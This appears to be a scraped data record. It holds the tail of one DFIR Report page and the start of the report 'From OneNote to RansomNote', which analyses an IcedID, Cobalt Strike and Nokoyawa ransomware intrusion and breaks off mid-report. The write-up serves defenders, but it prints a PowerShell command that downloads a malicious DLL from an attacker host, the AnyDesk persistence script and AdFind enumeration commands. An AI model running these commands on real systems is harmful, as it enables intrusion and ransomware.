e1521e077079032df974c7ae39e4737cdb4f05c6ded677ed5446167466eeb899 vhd.dll 95c96de7dcb5a643559ac66045559cc9 68b6d0cc1430e2d4f70e2ba5026d1c4847324269 a4bc6bebabb52ed9816987b77ebae6ef70e174533a643aea6265bdf1ed9b8952 gt_net.exe abb2a6a0f771ab20ce2037d2c4ef5783 ac0fcbc148e45e172c9be0acf9c307186f898803 aeaf7cc7364a44b381af9f317fe6f78c2717217800b93bee8839ab3e56233254 grb_net.exe 88df27b6e794e3fd5f93f28b1ca1d3d0 2114d655805f465d11b720830d150c145039bcd4 f8810179ab033a9b79cd7006c1a74fbcde6ed0451c92fbb8c7ce15b52499353a adfind.exe 12011c44955fd6631113f68a99447515 4f4f8cf0f9b47d0ad95d159201fe7e72fbc8448d c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 sh.exe 829a9dfd2cdcf50519a1cec1f529854b 5bf41754bfb3a18611b2a02f7f385960ed24f8e1 a7240d8a7aee872c08b915a58976a1ddee2ff5a8a679f78ec1c7cf528f40deed netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 Detections Network ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init ThreatFox SectopRAT botnet C2 traffic (ip:port - confidence level: 100%) ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity ET INFO Suspected Impacket WMIExec Activity Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Private Rules: 85d1ebcc-0145-4033-a344-f9f3a4dd03ac : Sharphound File Writes 932dd739-3672-458e-b362-b3cedba992ba : Grixba Reconnaissance Tool Execution 97350071-6934-4d1e-863d-23b7f51fb17d : SharpHound Active Directory Enumeration Tool Execution Sigma Repo: 17d619c1-e020-4347-957e-1d1207455c93 : Active Directory Replication from Non Machine Account b85e5894-9b19-4d86-8c87-a2f3b81f0521 : BITS Transfer Job Downloading File Potential Suspicious Extension 6d44fb93-e7d2-475c-9d3d-54c9c1e33427 : BITS Transfer Job With Uncommon Or Suspicious Remote TLD 02773bed-83bf-469f-b7ff-e676e7d78bab : BloodHound Collection Files f376c8a7-a2d0-4ddc-aa0c-16c17236d962 : HackTool \u2013 Bloodhound/Sharphound Execution 611eab06-a145-4dfa-a295-3ccc5c20f59a : Mimikatz DC Sync 7b434893-c57d-4f41-908d-6a17bf1ae98f : Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools cf879ffb-793a-4753-9a14-bc8f37cc90df : Potential Qakbot Rundll32 Execution 3dfd06d2-eaf4-4532-9555-68aca59f57c4 : Process Execution From A Potentially Suspicious Folder 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4 : PSEXEC Remote Execution File Artifact 7c0dcd3d-acf8-4f71-9570-f448b0034f94 : PsExec Service Child Process Execution as LOCAL SYSTEM 9a132afa-654e-11eb-ae93-0242ac130002 : PUA \u2013 AdFind Suspicious Execution b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e : Suspicious Binaries and Scripts in Public Folder bbb7e38c-0b41-4a11-b306-d2a457b7ac2b : Suspicious File Created In PerfLogs 1277f594-a7d1-4f28-a2d3-73af5cbeab43 : Windows Shell/Scripting Application File Write to Suspicious Folder Yara MALPEDIA_Win_Systembc_Auto DITEKSHEN_MALWARE_Win_EXEPWSH_Dlagent TELEKOM_SECURITY_Win_Systembc_20220311 EXT_MAL_SystemBC_Mar22_1 ELASTIC_Windows_Trojan_Systembc_C1B58C2F SUSP_XORed_URL_In_EXE DITEKSHEN_MALWARE_Win_Arechclient2 ELASTIC_Windows_Trojan_Redlinestealer_15Ee6903 ELASTIC_Windows_Generic_Threat_2Ae9B09E MITRE ATT&CK Additional Local or Domain Groups - T1098.007 Archive via Utility - T1560.001 Automated Collection - T1119 Create Account - T1136 Credentials from Password Stores - T1555 DCSync - T1003.006 Disable or Modify Tools - T1562.001 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Group Policy Discovery - T1615 Lateral Tool Transfer - T1570 Local Account - T1087.001 Local Account - T1136.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerading - T1036 MSBuild - T1127.001 Network Service Discovery - T1046 Network Share Discovery - T1135 Obfuscated Files or Information - T1027 PowerShell - T1059.001 Protocol Tunneling - T1572 Proxy - T1090 Registry Run Keys / Startup Folder - T1547.001 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Service Execution - T1569.002 System Network Configuration Discovery - T1016 Timestomp - T1070.006 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Windows Service - T1543.003 Internal Case #TB32034 #PR37389 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 3
  },
  {
    "url": "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
    "title": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report",
    "content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to 